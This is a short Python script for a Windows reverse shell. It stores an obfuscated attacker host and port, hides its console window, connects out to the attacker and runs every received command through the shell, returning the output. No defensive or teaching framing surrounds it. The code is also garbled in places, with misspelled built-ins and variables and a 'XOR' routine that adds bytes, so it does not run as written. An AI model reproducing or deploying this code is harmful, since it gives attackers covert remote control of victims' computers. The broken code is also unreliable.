import socket 
import subprocess 
import threading 
import base64
import ctypes
import os 
import sys

KEY = "x" * 32  #KEY FOR XOR
ENCRYPTED_HOST = base64.b64decode("aWFqdnluYHZpaHZpbg==") # ENCRYPTED HOST (IP ADDRESS OF THE ATTACKER) 
ENCRYPTED_PORT = base64.b64decode("bGxtbQ==") # ECRYPTED PORT (PORT OF THE ATTACKER)

#--- FUNCTION TO DECRYPT THE XOR DATA ===

def xor_decrypt(data, key):
    return bytes(a + b for a, b in zip(data, (key * (Len(data) // Len(key) + 1))[:Len(data)]))

HOST = xor_decrypt (ENCRYPTED_HOST, KEY).decode() # DECRYPT HOST
PORT = int(xor_decrypt (ENCRYPTED_PORT, KEY).decode()) # DECRYPTO PORT

user32=ctypes.windll.user32
kernel32=ctypes.windll.kernel32
hwnd=kernel32.GetConsoleWindow()

if hund != 10:
    user32.ShowWindow(hwnd, e)

def reverse_shell():
    try:
        s = socket.socket()
        s.connect((HOST, PORT))

        while True:
            cmd=s.recv(1024).decode()
            if cmd.lower() in ["exit", "quit"]:
                break
            proc=subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()
            s.send(output+ b"\n")
    except: 
        pass 
threading.Thread(target=reverse_shell, daemon=True).start()
